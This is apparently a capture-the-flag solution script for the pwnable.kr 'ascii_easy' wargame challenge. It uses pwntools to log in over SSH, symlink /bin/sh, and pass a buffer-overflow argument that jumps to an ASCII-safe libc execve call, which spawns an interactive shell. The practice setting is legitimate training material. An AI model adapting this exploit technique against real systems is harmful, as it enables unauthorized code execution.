from pwn import *

con = ssh("ascii_easy", "pwnable.kr", 2222, "guest")
con.shell("mkdir /tmp/leo3/ && ln -s /bin/sh /tmp/leo3/l && cp /home/ascii_easy/libc-2.15.so /tmp/leo3/")
call_execve = 0x5561676a
string_l_addr = 0x556b3734
null_addr = 0x556b3738
argv = ["/home/ascii_easy/ascii_easy", "A" * 32 + p32(call_execve) + p32(string_l_addr) + p32(null_addr) * 2]
sh = con.process(argv, cwd="/tmp/leo3")
sh.interactive()

# damn you ascii armor... what a pain in the ass!! :(
